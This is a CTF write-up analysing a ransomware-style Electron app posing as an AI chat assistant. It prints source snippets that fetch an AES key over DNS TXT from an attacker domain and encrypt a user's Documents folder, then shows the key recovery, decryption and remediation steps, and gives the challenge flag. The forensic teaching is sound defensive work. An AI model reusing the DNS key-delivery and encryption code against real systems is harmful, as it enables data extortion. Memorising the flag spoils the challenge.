-e ---
layout: post
title: Rogue Commit
category: AI Sec + DFIR
difficulty: Medium
points: 60
event: 2026 An AI Odyssey
date: 2026-05-28
---
**Difficulty:** Medium  
**Points:** 60  
**Flag:** `THM{Wh0_Kn3w_AI_Apps_C4n_B3_m4lic10us}`

---

## Overview

Rogue Commit is a medium-difficulty AI Security + Digital Forensics and Incident Response (DFIR) challenge. We are given a collection of user artifacts and a packet capture from a compromised machine. The objective is to investigate a suspicious Electron application, understand how it encrypted the victim's files, recover the encryption key, and decrypt the data to uncover a hidden flag.

The core attack was a ransomware-style Electron app that disguised itself as an AI chat assistant. It used DNS as a covert channel to retrieve an encryption key from an attacker-controlled server, then silently encrypted all files in the victim's Documents folder.

---

## Artifacts Provided

| File | Type | Notes |
|---|---|---|
| `traffic.pcapng` | Packet capture | Full network traffic from the victim machine |
| `Users_developer_Documents_ai_research_division.bin` | Encrypted file | Largest encrypted file — contains the flag |
| `Users_developer_Documents_notes.bin` | Encrypted file | Meeting notes |
| `Users_developer_Documents_vpn_credentials.bin` | Encrypted file | VPN access credentials |
| `Users_developer_Documents_dataset_sources.bin` | Encrypted file | Research dataset index |
| `Users_developer_Downloads_app.asar` | Electron app archive | The malicious application |
| `_Users_developer_Downloads_app.asar.extracted/` | Extracted source | Pre-extracted JS source code |
| Various `.lnk` / `.url` files | Windows shortcuts | Forensic artifacts |

---

## Step 1 — Inventory the Evidence

Before touching any files, the first step in any DFIR investigation is understanding what you have. Listing the zip contents without extracting gives a quick overview:

```bash
unzip -l roguecommit.zip
```

Key observations:
- A 22MB packet capture suggesting significant network activity
- Multiple `.bin` files — likely encrypted documents
- An `.asar` file — an Electron application archive containing readable JavaScript source code

---

## Step 2 — Analyse the Suspicious Application

An `.asar` file is an archive format used by Electron desktop apps (the same framework used by VS Code, Discord, and Slack). Crucially, **the source code inside is not compiled** — it is readable JavaScript. This makes it ideal for malware analysis.

The room pre-extracted the source into `778.html`. Reading this file revealed the full malicious logic.

### What the app pretended to be

The app posed as an AI chat assistant, complete with convincing random responses:

```javascript
const responses = [
  "That's an interesting question! Let me think about that...",
  "Great point! Here's what I know about that topic.",
  ...
]
```

A completely innocent-looking UI — while running malicious code in the background.

### The malicious logic

Three key functions were identified:

**1. Hardcoded encryption parameters:**
```javascript
const IV = Buffer.from('4b7a9c2e1f8d3a6b4b7a9c2e1f8d3a6b', 'hex')
const FLAG_DOMAIN = 'free-ai-assistant.xyz'
const TARGET_DIR = path.join('C:', 'Users', 'developer', 'Documents')
```

**2. Key retrieval via DNS:**
```javascript
function getKeyFromDNS(domain, callback) {
  dns.resolveTxt(domain, (err, records) => {
    const key = records.flat().join('')
    callback(key)
  })
}
```

**3. File encryption:**
```javascript
function encryptFile(inputPath, keyString) {
  const key = Buffer.from(keyString, 'hex').slice(0, 32)
  const cipher = crypto.createCipheriv('aes-256-cbc', key, IV)
  const encrypted = Buffer.concat([cipher.update(fileBuffer), cipher.final()])
  fs.writeFileSync(newPath, encrypted)
}
```

### Summary of the attack logic

On launch, the app:
1. Makes a DNS TXT query to `free-ai-assistant.xyz`
2. Uses the response as the AES encryption key
3. Encrypts every file in `C:\Users\developer\Documents\`
4. Renames encrypted files to `.bin`

This is **ransomware** disguised as a helpful AI tool.

### Why DNS?

Using DNS as a key delivery mechanism is a clever attacker technique:
- DNS traffic is rarely blocked by firewalls
- It blends in with normal network activity
- Most monitoring tools focus on HTTP/HTTPS, not DNS TXT records
- The key never appears in the app's source code — only the domain does

---

## Step 3 — Extract the Encryption Key from the PCAP

Now that we knew the malware fetched its key via DNS from `free-ai-assistant.xyz`, we could hunt for it in the packet capture.

**Tool:** Wireshark  
**Filter used:**
```
dns.qry.name == "free-ai-assistant.xyz"
```

This filtered the capture down to just DNS traffic for that domain. In the DNS response packet, expanding the **Answers** section revealed a TXT record:

```
5f4514434fc47f1f661d8a73806fd436
```

**This is the encryption key the attacker's server delivered to the malware at runtime.**

---

## Step 4 — Decrypt the Files

With both required decryption parameters recovered, we could now decrypt the victim's files.

| Parameter | Value | Source |
|---|---|---|
| Algorithm | AES-CBC | Source code |
| IV | `4b7a9c2e1f8d3a6b4b7a9c2e1f8d3a6b` | Hardcoded in source code |
| Key | `5f4514434fc47f1f661d8a73806fd436` | DNS TXT record in PCAP |

**Tool:** CyberChef (`https://gchq.github.io/CyberChef`)

**Recipe:**
- Operation: **AES Decrypt**
- Key: `5f4514434fc47f1f661d8a73806fd436` (Hex)
- IV: `4b7a9c2e1f8d3a6b4b7a9c2e1f8d3a6b` (Hex)
- Mode: **CBC**
- Input: **Raw**
- Padding: **PKCS7**

Loading `ai_research_division.bin` and saving the output as a PDF revealed a classified AI Research Division document containing the flag.

---

## Flag

```
THM{Wh0_Kn3w_AI_Apps_C4n_B3_m4lic10us}
```

---

## Attack Chain Summary

```
Victim downloads fake "AI Chat" app
          ↓
App launches → DNS TXT query to free-ai-assistant.xyz
          ↓
Attacker's DNS server responds with encryption key
          ↓
App encrypts all files in Documents\ with AES-CBC
          ↓
Victim's files renamed to .bin — inaccessible without the key
          ↓
[Investigation]
Source code analysis → identifies algorithm, IV, and C2 domain
PCAP analysis → recovers the encryption key from DNS response
CyberChef → decrypts files and recovers the flag
```

---

## Remediation & Detection

| Issue | Recommendation |
|---|---|
| Malicious Electron app | Enforce application allowlisting; only permit signed, verified software |
| DNS used as covert channel | Monitor DNS TXT record queries — legitimate apps rarely use them |
| Ransomware-style encryption | Maintain offline backups; implement file integrity monitoring |
| No code signing | Require all downloaded executables to be digitally signed |
| DNS to unknown domain | Use DNS filtering (e.g. Pi-hole, Cisco Umbrella) to block unknown/new domains |

---

## Key Concepts Learned

- **Electron app analysis** — `.asar` archives contain readable source code, making them straightforward to reverse
- **DNS as a covert C2 channel** — TXT records can carry arbitrary data including encryption keys
- **AES-CBC encryption** — requires both a key (secret) and an IV (not secret but required) to decrypt
- **DFIR methodology** — evidence from one source (source code) directs investigation of the next (PCAP)
- **CyberChef** — browser-based tool for encryption, decoding, and file analysis without writing code

---

## Tools Used

- Wireshark (PCAP analysis)
- CyberChef (decryption)
- unzip / file (initial triage)

---

*Writeup by: ByteChef | TryHackMe: ByteChef*  
*Challenge: TryHackMe — 2026: An AI Odyssey CTF | Task 2: Rogue Commit*
